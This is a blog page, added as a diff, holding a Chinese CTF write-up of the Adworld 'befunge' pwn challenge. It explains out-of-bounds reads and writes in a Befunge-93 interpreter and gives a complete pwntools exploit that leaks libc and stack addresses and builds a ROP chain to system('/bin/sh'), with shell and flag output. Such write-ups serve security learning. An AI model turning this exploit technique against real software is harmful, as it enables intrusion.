@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="漏洞解析攻防世界pwn进阶区8分题，是一道比较有意思的虚拟机pwn。该程序模拟了一个Befunge语言的解释器  Befunge的代码是二维的。它用 &lt; &gt; v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="befunge">
+<meta property="og:url" content="https://xidoo123.github.io/2021/01/12/befunge/index.html">
+<meta property="og:site_name" content="Stay hungry">
+<meta property="og:description" content="漏洞解析攻防世界pwn进阶区8分题，是一道比较有意思的虚拟机pwn。该程序模拟了一个Befunge语言的解释器  Befunge的代码是二维的。它用 &lt; &gt; v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-12T11:34:07.000Z">
+<meta property="article:modified_time" content="2021-01-12T12:04:31.564Z">
+<meta property="article:author" content="X1do0">
+<meta property="article:tag" content="vmpwn">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/veg.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>befunge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/07/03/pwnable-tw/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xidoo123.github.io/2021/01/12/befunge/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xidoo123.github.io/2021/01/12/befunge/&text=befunge" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xidoo123.github.io/2021/01/12/befunge/&is_video=false&description=befunge" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=befunge&body=Check out this article: https://xidoo123.github.io/2021/01/12/befunge/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xidoo123.github.io/2021/01/12/befunge/&title=befunge" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xidoo123.github.io/2021/01/12/befunge/&name=befunge&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xidoo123.github.io/2021/01/12/befunge/&t=befunge" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞解析"><span class="toc-number">1.</span> <span class="toc-text">漏洞解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        befunge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">X1do0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-01-12T11:34:07.000Z" itemprop="datePublished">2021-01-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/vmpwn/" rel="tag">vmpwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h2><p>攻防世界pwn进阶区8分题，是一道比较有意思的虚拟机pwn。该程序模拟了一个<strong>Befunge</strong>语言的解释器</p>
+<blockquote>
+<p>Befunge的代码是二维的。它用 &lt; &gt; v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下）走。&amp; 和 ~ 分别用于读入数字或字符并压入栈，句号和逗号分别表示将栈顶元素作为整数或字符输出。最后以一个@符号表示程序结束。</p>
+</blockquote>
+<p>保护全开，根据提示是一个Befunge93解释器，查阅一些资料（[1], [2],[3]）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwn @ ubuntu in /mnt/hgfs/adworld [3:39:33] C:1</span></span><br><span class="line">$ ./interpreter-200</span><br><span class="line">Welcome to Online Befunge(93) Interpreter</span><br><span class="line">Please input your program.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>耐心逆一下可以发现确实如此，<code>program[2000]</code>按二维组织成$25*80$。</p>
+<p>代码上下左右移动靠下面的跳转表实现。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000014E0 ; _DWORD dword_14E0[4]</span><br><span class="line">.rodata:00000000000014E0 dword_14E0      dd 0, 1, 0, 0FFFFFFFFh  ; DATA XREF: main+520↑o</span><br><span class="line">.rodata:00000000000014F0 ; _DWORD dword_14F0[4]</span><br><span class="line">.rodata:00000000000014F0 dword_14F0      dd 1, 0, 0FFFFFFFFh, 0  ; DATA XREF: main+536↑o</span><br></pre></td></tr></table></figure>
+
+<p>每次读取代码后依据方向改变下一次读取位置，其中x为行数，y为列数，就像走迷宫一样。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*执行方向	0-右	1-下	2-左	3-上	*/</span></span><br><span class="line">prog_x += dword_14E0[direction];</span><br><span class="line">v30 = prog_y + dword_14F0[direction];</span><br><span class="line">prog_y += dword_14F0[direction];</span><br><span class="line"><span class="keyword">if</span> ( prog_x == <span class="number">-1</span> )                         <span class="comment">// 25*80的program矩阵</span></span><br><span class="line">&#123;</span><br><span class="line">    prog_x = <span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( prog_x == <span class="number">25</span> )</span><br><span class="line">&#123;</span><br><span class="line">    prog_x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v30 == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    prog_y = <span class="number">79</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( prog_y == <span class="number">80</span> )</span><br><span class="line">&#123;</span><br><span class="line">    prog_y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意到program数组是<code>char</code>，stack数组是<code>QWARD</code>，所以pop和push都是<code>int64</code>类型，所以漏洞点也比较明显，在主函数中g与p都能越界，这样便可以任意地址读写，布置rop链即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'g'</span>:</span><br><span class="line">    v26 = pop();</span><br><span class="line">    v27 = pop();</span><br><span class="line">    push(program[<span class="number">80</span> * v26 + v27]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">    v28 = pop();</span><br><span class="line">    v29 = pop();</span><br><span class="line">    program[<span class="number">80</span> * v28 + v29] = pop();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们需要泄露很多东西，got表里有<code>puts_ptr</code>和<code>program_ptr</code>，我们可以泄露<code>elf_base</code>和<code>libc_base</code>，由于要布置ROP链，也需要拿到一个栈指针，这里也是先拿到libc地址，然后用<code>environ</code>变量拿到栈指针。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>总体来说在进阶区里还是算比较难的题，逆向和漏洞利用工作量都不小。exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./interpreter-200"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote("220.249.52.134",33610)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0xE05+0x555555554000")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x202040 -&gt; 0x201F50</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">"b *0x1203+0x555555554000"</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">"&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,"</span>  <span class="comment"># leak puts_addr </span></span><br><span class="line"></span><br><span class="line">program += <span class="string">"&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,"</span> <span class="comment">#leak elf_addr </span></span><br><span class="line"></span><br><span class="line">program = program.ljust(<span class="number">79</span>, <span class="string">" "</span>) + <span class="string">"v\n"</span></span><br><span class="line">program += <span class="string">"v"</span> + <span class="string">" "</span>*<span class="number">78</span> + <span class="string">"&lt;\n"</span> </span><br><span class="line"></span><br><span class="line">program += <span class="string">"&gt;&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,&amp;&amp;&amp;*&amp;+g,"</span>.ljust(<span class="number">79</span>, <span class="string">" "</span>) + <span class="string">"v\n"</span><span class="comment"># leak stack_addr</span></span><br><span class="line">program += <span class="string">"v"</span> + <span class="string">" "</span>*<span class="number">78</span> + <span class="string">"&lt;\n"</span> </span><br><span class="line"></span><br><span class="line">program += (<span class="string">"&gt;"</span> + <span class="string">"&amp;&amp;&amp;&amp;*&amp;+p"</span>*<span class="number">8</span>).ljust(<span class="number">79</span>, <span class="string">" "</span>) + <span class="string">'v\n'</span>   <span class="comment"># ROP exploit</span></span><br><span class="line">program += <span class="string">"v"</span> + <span class="string">" "</span>*<span class="number">78</span> + <span class="string">"&lt;\n"</span> </span><br><span class="line">program += (<span class="string">"&gt;"</span> + <span class="string">"&amp;&amp;&amp;&amp;*&amp;+p"</span>*<span class="number">8</span>).ljust(<span class="number">79</span>,<span class="string">" "</span>) + <span class="string">'v\n'</span></span><br><span class="line">program += <span class="string">"v"</span> + <span class="string">" "</span>*<span class="number">78</span> + <span class="string">"&lt;\n"</span> </span><br><span class="line">program += <span class="string">"&gt;"</span> + <span class="string">"&amp;&amp;&amp;&amp;*&amp;+p"</span>*<span class="number">8</span> + <span class="string">'&gt;&lt;'</span></span><br><span class="line"></span><br><span class="line">io.sendline(program.ljust(<span class="number">2000</span>,<span class="string">'@'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">  io.sendline(str(i))</span><br><span class="line">  io.sendline(<span class="string">"-3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(6):</span></span><br><span class="line"><span class="comment">#  io.sendline(str(i+0x28))</span></span><br><span class="line"><span class="comment">#  io.sendline("-3")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-16</span>, <span class="number">-10</span>):</span><br><span class="line">  io.sendline(str(i))</span><br><span class="line">  io.sendline(<span class="string">"-1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; "</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="comment">#fgets_addr = u64(io.recv(6)+'\x00\x00')</span></span><br><span class="line"><span class="comment">#success(len(io.recv(6)))</span></span><br><span class="line">progbuf_addr = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - <span class="number">0x6F690</span></span><br><span class="line">environ = libc_base + <span class="number">0x3c6f38</span></span><br><span class="line">elf_base = progbuf_addr - <span class="number">0x202040</span></span><br><span class="line"></span><br><span class="line">success(hex(elf_base))</span><br><span class="line">success(hex(environ))</span><br><span class="line">success(hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line">x = (environ - elf_base - <span class="number">0x202040</span>) / <span class="number">80</span></span><br><span class="line">y =  (environ - elf_base - <span class="number">0x202040</span>) % <span class="number">80</span></span><br><span class="line"></span><br><span class="line">x_1 = x / <span class="number">50000</span></span><br><span class="line">x_2 = x % <span class="number">50000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">  io.sendline(str(y+i))</span><br><span class="line">  io.sendline(str(x_1))</span><br><span class="line">  io.sendline(str(<span class="number">50000</span>))</span><br><span class="line">  io.sendline(str(x_2))</span><br><span class="line"></span><br><span class="line">stack_addr = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">  stack_addr += io.recv(<span class="number">1</span>)</span><br><span class="line">stack_addr = u64(stack_addr+<span class="string">'\x00\x00'</span>)</span><br><span class="line">success(hex(stack_addr))</span><br><span class="line">rop_target = stack_addr - <span class="number">0x128</span> + <span class="number">0x38</span></span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">offset = rop_target - progbuf_addr</span><br><span class="line">prdir = <span class="number">0x120c</span> + elf_base</span><br><span class="line">binsh_addr = libc_base + <span class="number">0x18cd57</span> </span><br><span class="line">system_addr = libc_base + <span class="number">0x045390</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write(progbuf_addr + offset, value, 8)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(offset, value)</span>:</span></span><br><span class="line">  x = offset / <span class="number">80</span></span><br><span class="line">  y = offset % <span class="number">80</span></span><br><span class="line">  x_1 = x / <span class="number">50000</span></span><br><span class="line">  x_2 = x % <span class="number">50000</span></span><br><span class="line">  success(x_1)</span><br><span class="line">  success(x_2)</span><br><span class="line">  success(y)</span><br><span class="line">  success(hex(value))</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    val = value &amp; <span class="number">0xff</span></span><br><span class="line">    value = value &gt;&gt; <span class="number">8</span></span><br><span class="line">    success(<span class="string">"round&#123;&#125;: val:&#123;&#125; | y:&#123;&#125; | x_1:&#123;&#125; | x_2:&#123;&#125; | write at:&#123;&#125;"</span>.format(i, hex(val), y+i, x_1, x_2, hex((x_1*<span class="number">50000</span>+x_2)*<span class="number">80</span>+y+i+progbuf_addr)))</span><br><span class="line">    io.sendline(str(val))</span><br><span class="line">    io.sendline(str(y+i))</span><br><span class="line">    io.sendline(str(x_1))</span><br><span class="line">    io.sendline(str(<span class="number">50000</span>))</span><br><span class="line">    io.sendline(str(x_2))</span><br><span class="line"></span><br><span class="line">edit(offset, prdir)</span><br><span class="line">edit(offset+<span class="number">8</span>, binsh_addr)</span><br><span class="line">edit(offset+<span class="number">16</span>, system_addr)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功与服务器交互</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[+] 11470264</span><br><span class="line">[+] 27054</span><br><span class="line">[+] 56</span><br><span class="line">[+] 0x56434fd4f20c</span><br><span class="line">[+] round0: val:0xc | y:56 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed8</span><br><span class="line">[+] round1: val:0xf2 | y:57 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed9</span><br><span class="line">[+] round2: val:0xd4 | y:58 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eda</span><br><span class="line">[+] round3: val:0x4f | y:59 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edb</span><br><span class="line">[+] round4: val:0x43 | y:60 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edc</span><br><span class="line">[+] round5: val:0x56 | y:61 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edd</span><br><span class="line">[+] round6: val:0x0 | y:62 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ede</span><br><span class="line">[+] round7: val:0x0 | y:63 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edf</span><br><span class="line">[+] 11470264</span><br><span class="line">[+] 27054</span><br><span class="line">[+] 64</span><br><span class="line">[+] 0x7f9040bcfd57</span><br><span class="line">[+] round0: val:0x57 | y:64 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee0</span><br><span class="line">[+] round1: val:0xfd | y:65 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee1</span><br><span class="line">[+] round2: val:0xbc | y:66 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee2</span><br><span class="line">[+] round3: val:0x40 | y:67 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee3</span><br><span class="line">[+] round4: val:0x90 | y:68 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee4</span><br><span class="line">[+] round5: val:0x7f | y:69 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee5</span><br><span class="line">[+] round6: val:0x0 | y:70 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee6</span><br><span class="line">[+] round7: val:0x0 | y:71 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee7</span><br><span class="line">[+] 11470264</span><br><span class="line">[+] 27054</span><br><span class="line">[+] 72</span><br><span class="line">[+] 0x7f9040a88390</span><br><span class="line">[+] round0: val:0x90 | y:72 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee8</span><br><span class="line">[+] round1: val:0x83 | y:73 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee9</span><br><span class="line">[+] round2: val:0xa8 | y:74 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eea</span><br><span class="line">[+] round3: val:0x40 | y:75 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eeb</span><br><span class="line">[+] round4: val:0x90 | y:76 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eec</span><br><span class="line">[+] round5: val:0x7f | y:77 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eed</span><br><span class="line">[+] round6: val:0x0 | y:78 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eee</span><br><span class="line">[+] round7: val:0x0 | y:79 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eef</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Too many steps. Is there any infinite loops?</span><br><span class="line">$ ls</span><br><span class="line">befunge</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">$ cat flag</span><br><span class="line">cyberpeace&#123;98a98f0ba1ad006fb670b684a2c0c129&#125;</span><br><span class="line">Time out</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a href="http://www.matrix67.com/blog/archives/253" target="_blank" rel="noopener">http://www.matrix67.com/blog/archives/253</a></p>
+<p>[2] <a href="https://www.jianshu.com/p/ed929cf72312" target="_blank" rel="noopener">https://www.jianshu.com/p/ed929cf72312</a></p>
+<p>[3] <a href="http://quadium.net/funge/spec98.html" target="_blank" rel="noopener">http://quadium.net/funge/spec98.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞解析"><span class="toc-number">1.</span> <span class="toc-text">漏洞解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
